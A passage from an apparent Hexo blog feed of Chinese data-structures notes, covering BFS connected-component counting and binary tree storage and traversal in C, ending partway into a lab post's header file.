class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                <span class="built_in">queue</span>[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            bfs(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LinkedGraph g;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    create(&amp;g,<span class="string">&quot;g7.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line">    count = BfsTraverse(g);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n 该图共有 %d 个连通分量。\n&quot;</span>,count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>二叉树</title>
    <link href="https://xizhi-future.github.io/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>https://xizhi-future.github.io/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2021-11-13T01:02:23.000Z</published>
    <updated>2021-11-14T09:28:48.479Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>由结点构成的有限集合，集合可为空，或者是由一个根结点以及两颗互不相交的分别称作 该根结点的左子树域右子树的二叉树组成。</p><p>空二叉树</p><p><strong>二叉树五种基本形态</strong></p><p><img src="https://i.loli.net/2021/10/30/QzNZd9lI8VtuiMG.png" alt="image-20211030164242923"></p><blockquote><p><strong>二叉树与一般的树型结构的区别在于：</strong></p><ul><li>二叉树中每个非空结点最多只有两个子女，而一般的树型结构中每个非空结点可以有0到多<br>个子女;</li><li>二叉树中结点的子树要区分左子树和右子树，即使在结点只有一棵子树的情况下也要明确指<br>出是左子树还是右子树。</li></ul></blockquote><h2 id="1-2-二叉树-性质"><a href="#1-2-二叉树-性质" class="headerlink" title="1.2 二叉树 性质"></a>1.2 二叉树 性质</h2><ul><li><p><strong>性质1：</strong>一棵非空二叉树的 <code>第i层</code>  上至多有 <code>2 的 i-1 次方</code>  个 结点 (i≥1)。</p></li><li><p><strong>性质2：</strong>深度为h的二叉树至多有 <code>2 的 h 次方 -1</code> 个结点(h&gt;1) 。</p></li><li><p><strong>性质3：</strong> 对于任何一棵二叉树T，如果其终端结点数为no，度为2的结点数为n2，则 no=n2+1。</p></li><li><p><strong>性质4：</strong>具有 n 个结点的完全二叉树的深度 是 <code>[log以2为底n的对数] + 1</code></p></li></ul><p><strong>其它性质：</strong></p><p><img src="https://i.loli.net/2021/10/30/4kDm5FiaLGntrZe.png" alt="image-20211030164825001"></p><p><strong>完全二叉树、满二叉树：</strong></p><p><img src="https://i.loli.net/2021/10/30/9pg6GoC28vPEsVu.png" alt="image-20211030164916049"></p><p><strong>完全二叉树的性质：</strong></p><p><img src="https://i.loli.net/2021/10/30/d7EBmp4CgeXqG58.png" alt="image-20211030165111674"></p><h2 id="1-3-二叉树的-存储结构"><a href="#1-3-二叉树的-存储结构" class="headerlink" title="1.3 二叉树的 存储结构"></a>1.3 二叉树的 存储结构</h2><h3 id="1-3-1-完全二叉树-的-顺序存储"><a href="#1-3-1-完全二叉树-的-顺序存储" class="headerlink" title="1.3.1 完全二叉树 的 顺序存储"></a>1.3.1 完全二叉树 的 顺序存储</h3><p>按照 二叉树 从上到下、同一层次 从左到右的顺序，依次将结点存储在 一个 <strong>一维数组</strong> 中。</p><p>利用完全二叉树的性质</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;  <span class="comment">//二叉树结点类型</span></span><br><span class="line">datatype tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;  <span class="comment">//树 实际所含结点个数</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/f6vuodkaFwZjc9Y.png" alt="image-20211030165424030"></p><h3 id="1-3-2-一般二叉树-的-顺序存储"><a href="#1-3-2-一般二叉树-的-顺序存储" class="headerlink" title="1.3.2 一般二叉树 的 顺序存储"></a>1.3.2 一般二叉树 的 顺序存储</h3><p>每个结点：三个域</p><p>值域：data</p><p><strong>不带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>     <span class="comment">//结点值类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;  <span class="comment">//存放 左、右 子女下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];  </span><br><span class="line"><span class="keyword">int</span> n;<span class="comment">//树中实际所含结点个数</span></span><br><span class="line"><span class="keyword">int</span> root;<span class="comment">//存放根结点的下标</span></span><br></pre></td></tr></table></figure><p><strong>带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;</span><br><span class="line">    <span class="keyword">int</span> parent;  <span class="comment">//存放双亲结点下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> root;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p><h3 id="1-3-2-链式存储"><a href="#1-3-2-链式存储" class="headerlink" title="1.3.2 链式存储"></a>1.3.2 链式存储</h3><p>每个结点：三个域</p><p>值域：data</p><p>指针域：分别指向左右子树</p><p><strong>不带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>    <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>  <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;</span><br></pre></td></tr></table></figure><p><strong>带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">parent</span>;</span>  <span class="comment">//指向双亲的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;<span class="comment">//指向二叉树根结点的指针</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/mFjtMqDdRkezGc2.png" alt="image-20211030170230015"></p><h2 id="1-4-二叉树的遍历-—–-递归实现"><a href="#1-4-二叉树的遍历-—–-递归实现" class="headerlink" title="1.4 二叉树的遍历  —– 递归实现"></a>1.4 二叉树的遍历  —– 递归实现</h2><p>按照一定的顺序对二叉树这每个结点进行访问，且只能访问一次。</p><p><img src="https://i.loli.net/2021/10/30/YIS3fLvetOKocgH.png" alt="image-20211030171335598"></p><h3 id="1-4-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-4-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.4.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.4.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-4-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.4.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.4.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-4-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.4.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.4.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-5-二叉树的创建"><a href="#1-5-二叉树的创建" class="headerlink" title="1.5 二叉树的创建"></a>1.5 二叉树的创建</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintree *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br></pre></td></tr></table></figure><h2 id="1-6-二叉树的遍历-—–-非递归实现"><a href="#1-6-二叉树的遍历-—–-非递归实现" class="headerlink" title="1.6 二叉树的遍历  —– 非递归实现"></a>1.6 二叉树的遍历  —– 非递归实现</h2><p>二叉树的 递归遍历 算法较简易，但是运行时间长，执行效率较低，下面是非递归算法实现二叉树的遍历。</p><p><strong>使用一个 <code>栈</code> 来进行回溯</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  <span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-6-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.6.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.6.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><ul><li><p>当访问完 根结点之后，紧接着该访问其左子树，但前提是必须先使 当前结点放于 栈中保存起来，便于之后 右子树的访问。</p></li><li><p>当栈中的元素位于栈顶即将出栈时，则意味着根结点和左子树已经访问完成，出栈之后即可进行右子树的访问。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-6-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.6.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.6.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><ul><li><p>首先访问 左子树，但由于此时 根结点和 右子树都未进行访问，则 需要将其 先放入栈中保存起来，以便之后对根结点和右子树的访问。</p></li><li><p>当栈中元素位于栈顶即将出栈时，即意味着其左子树已经访问完成，出栈后 则可 进行根结点和右子树的访问。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-6-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.6.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.6.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><ul><li><p>首先进行左子树的访问，同样需要将其先保存在栈中，便于之后对其 右子树以及根节点的访问。</p></li><li><p>需要使用 <code>seqstack类型  中的  数组 tag</code> ，其每个元素的值为0 或 1，用于标识栈中每个元素的状态。</p><p>当一个元素刚刚进栈时，当它第一次位于栈顶即将被处理时，其 tag 值为 0，意味着它的 右子树还没有进行访问，则接下来就应该访问它的 右子树，该元素仍旧在栈中，然后将其 tag 值改为 1，意味着此时其 右子树已经访问完成，当其第二次出现在栈顶即将被处理时，则意味着接下来应该访问它本身，即根结点，并将其出栈。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>数据结构第二次实验-二叉树的遍历（递归、非递归）</title>
    <link href="https://xizhi-future.github.io/2021/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%EF%BC%88%E9%80%92%E5%BD%92%E3%80%81%E9%9D%9E%E9%80%92%E5%BD%92%EF%BC%89/"/>
    <id>https://xizhi-future.github.io/2021/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%EF%BC%88%E9%80%92%E5%BD%92%E3%80%81%E9%9D%9E%E9%80%92%E5%BD%92%EF%BC%89/</id>
    <published>2021-11-13T00:59:50.000Z</published>
    <updated>2021-11-13T08:16:40.431Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/11/P5kz2rRZslSJpCy.png" alt="image-20211111231233214"></p><p><strong>头文件 <code>bintree.h</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span 